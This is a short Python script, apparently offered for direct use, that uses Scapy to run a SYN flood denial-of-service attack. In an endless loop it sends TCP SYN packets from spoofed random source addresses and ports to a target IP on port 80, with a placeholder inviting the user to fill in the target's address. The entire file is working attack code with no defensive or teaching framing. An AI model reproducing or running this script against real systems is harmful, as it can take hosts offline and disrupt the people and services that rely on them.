from scapy.all import *

target_ip = "192.168.1.100"  # Replace with the target IP
target_port = 80  # Target port (HTTP in this case)

def syn_flood():
    while True:
        ip_layer = IP(src=RandIP(), dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")  # SYN flag
        send(ip_layer / tcp_layer, verbose=False)
        print(f"Sent SYN packet to {target_ip}:{target_port}")

# Run the attack
syn_flood()
